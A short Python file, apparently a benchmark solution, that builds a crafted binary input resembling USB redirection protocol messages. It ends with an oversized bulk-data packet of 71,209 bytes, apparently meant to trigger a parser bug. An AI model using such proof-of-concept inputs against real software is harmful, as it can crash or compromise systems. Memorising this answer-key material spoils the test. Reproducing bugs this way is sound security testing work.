import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        hello = struct.pack('<II', 16, 0) + struct.pack('<II', 0x0200, 0x00010000)
        device_add = struct.pack('<II', 20, 1) + struct.pack('<III', 0, 0, 0)
        config_desc = b'\x09\x02\x19\x00\x01\x01\x00\x80\x32\x09\x04\x00\x00\x01\xff\xff\xff\x00\x07\x05\x02\x02\x40\x00\x00'
        add_config_data = struct.pack('<I', 0) + config_desc
        add_config = struct.pack('<II', 8 + len(add_config_data), 5) + add_config_data
        address = 0x00010002
        data_size = 71209
        bulk_data = struct.pack('<II', address, data_size) + b'\x00' * data_size
        bulk = struct.pack('<II', 8 + len(bulk_data), 9) + bulk_data
        return hello + device_add + add_config + bulk